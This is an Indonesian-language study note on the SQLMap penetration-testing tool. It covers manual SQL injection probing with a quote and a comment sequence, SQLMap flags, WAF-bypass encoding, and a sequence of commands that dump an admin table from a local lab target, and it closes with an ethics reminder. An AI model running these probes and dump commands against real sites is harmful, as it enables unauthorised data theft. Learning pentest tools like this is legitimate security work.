---
id: SQL Map
aliases: []
tags:
  - hacking_tools
comments: true
date: 2025-11-16
draft: false
---

---

Related: [[index|Home]], [[hacking_tools]] 

---

## Cue

- Apa itu SQLMap dan apa fungsi utamanya?
- Bagaimana cara mengidentifikasi potensi kerentanan SQL Injection secara manual?
- Apa saja langkah-langkah dasar untuk mengekstrak data dari database menggunakan SQLMap?
- Apa saja fitur-fitur penting yang dimiliki SQLMap?

---

## Notes

### Apa Itu SQLMap?
**SQLMap** adalah sebuah alat *open-source* yang mengotomatiskan proses pendeteksian dan eksploitasi kerentanan **SQL Injection**. Alat ini sangat populer di kalangan *pentester* karena kemampuannya untuk mengambil alih *server database* secara efisien.

### Langkah-Langkah Menggunakan SQLMap

#### 1. Mencari Target Rentan
- Temukan parameter pada URL yang terlihat memanipulasi data, misalnya `id=1`.
- Uji dengan menambahkan tanda kutip (`'`) pada akhir parameter: `id=1'`. Jika aplikasi menampilkan pesan *error* dari *database*, ini adalah indikasi kuat adanya kerentanan.
- Lakukan *balancing* dengan menambahkan komentar SQL (`-- -`) untuk menonaktifkan sisa *query*: `id=1'-- -`. Jika halaman kembali normal, target kemungkinan besar rentan.

#### 2. Menjalankan SQLMap
-   **Melihat Bantuan**: `sqlmap -h` untuk melihat semua opsi.
-   **Parameter Penting**:
    -   `-u`: Menentukan URL target.
    -   `--dbs`: Menampilkan daftar semua *database*.
    -   `-D`: Memilih *database* spesifik.
    -   `--tables`: Menampilkan tabel dari *database* yang dipilih.
    -   `-T`: Memilih tabel spesifik.
    -   `--columns`: Menampilkan kolom dari tabel yang dipilih.
    -   `--dump`: Mengekstrak seluruh data dari tabel.

#### 3. Contoh Alur Eksekusi
1.  **Mendapatkan Daftar Database**:
    ```bash
    sqlmap -u "https://local/vuln/read.php?id=1" --dbs
    ```
2.  **Melihat Tabel dalam Database**:
    ```bash
    sqlmap -u "https://local/vuln/read.php?id=1" -D vulnlabs --tables
    ```
3.  **Melihat Kolom dalam Tabel**:
    ```bash
    sqlmap -u "https://local/vuln/read.php?id=1" -D vulnlabs -T admin --columns
    ```
4.  **Mengekstrak Data**:
    ```bash
    sqlmap -u "https://local/vuln/read.php?id=1" -D vulnlabs -T admin --dump
    ```

### Fitur Penting SQLMap
-   **Deteksi Otomatis DBMS**: Mampu mengenali jenis *database* seperti MySQL, PostgreSQL, MSSQL, Oracle, dll.
-   **Berbagai Teknik Injeksi**: Mendukung teknik *Boolean-based*, *Error-based*, *Union-based*, dan *Time-based*.
-   **Bypass WAF**: Memiliki fitur untuk meng-*encode payload* guna menghindari deteksi *Web Application Firewall* (WAF).

### Catatan Etika dan Hukum
-   Gunakan SQLMap hanya pada sistem yang Anda miliki atau dengan izin eksplisit dari pemiliknya.
-   Penggunaan tanpa izin adalah ilegal dan dapat dikenakan sanksi hukum.

---

## Summary

SQLMap adalah alat pengujian penetrasi esensial yang mengotomatiskan deteksi dan eksploitasi kerentanan SQL Injection. Dengan serangkaian perintah sederhana, pengguna dapat mengidentifikasi parameter yang rentan, mengambil daftar *database*, tabel, kolom, hingga mengekstrak data sensitif. Karena kekuatannya, SQLMap harus digunakan secara etis dan hanya dalam lingkup pengujian keamanan yang sah.